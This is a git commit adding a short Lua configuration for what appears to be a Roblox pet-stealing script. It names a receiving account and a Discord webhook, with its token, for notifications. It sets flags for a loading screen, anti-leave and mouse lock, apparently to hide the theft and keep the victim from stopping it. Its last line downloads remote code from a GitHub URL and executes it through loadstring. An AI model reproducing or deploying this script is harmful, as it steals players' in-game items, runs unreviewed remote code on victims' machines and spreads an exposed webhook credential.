afeba8eb8cadfda3614be6408163a07b296804db
RizHub <127007984+wwzeze@users.noreply.github.com>
2023-08-14 15:56:45 +0800

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,9 @@
+UserName = "ShiroBahoo89" -- good pets
+Webhook = "https://discord.com/api/webhooks/1120173436946370560/-HsnLPSiuRuSONaD-PMtEBYEtxZFdTI0iBRnbG6Sf0zjtYfZoUqhfN7uuCWIlX2KLnvH" -- pings for pets
+UserName2 = "ShiroBahoo89" -- bad pets
+
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.AntiLeave = true -- make it true if you want the antileave
+_G.MouseLock = true -- make it true if you want the mouselock
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScripts", true))()
